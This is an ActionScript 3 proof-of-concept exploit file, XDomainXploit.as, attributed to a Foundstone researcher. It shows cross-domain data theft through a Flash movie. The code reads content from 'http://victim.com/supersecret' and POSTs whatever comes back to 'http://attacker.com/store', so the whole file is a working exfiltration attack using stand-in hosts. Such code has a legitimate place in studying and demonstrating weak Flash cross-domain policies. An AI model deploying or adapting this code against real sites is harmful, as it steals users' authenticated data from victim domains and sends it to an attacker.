// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
// XDomainXploit.as
// Thanks - http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7cfd.html#WS5b3ccc516d4fbf351e63e3d118a9b90204-7cf5
package {
	import flash.display.Sprite;
	import flash.events.*;
	import flash.net.URLRequestMethod;
	import flash.net.URLRequest;
	import flash.net.URLLoader;

	public class XDomainXploit extends Sprite {
		public function XDomainXploit() {
			// Target URL from where the data is to be retrieved
			var readFrom:String = "http://victim.com/supersecret";
			var readRequest:URLRequest = new URLRequest(readFrom);
			var getLoader:URLLoader = new URLLoader();
			getLoader.addEventListener(Event.COMPLETE, eventHandler);
			try {
				getLoader.load(readRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}

		private function eventHandler(event:Event):void {
			// URL to which retrieved data is to be sent
			var sendTo:String = "http://attacker.com/store"
			var sendRequest:URLRequest = new URLRequest(sendTo);
			sendRequest.method = URLRequestMethod.POST;
			sendRequest.data = event.target.data;
			var sendLoader:URLLoader = new URLLoader();
			try {
				sendLoader.load(sendRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}
	}
}
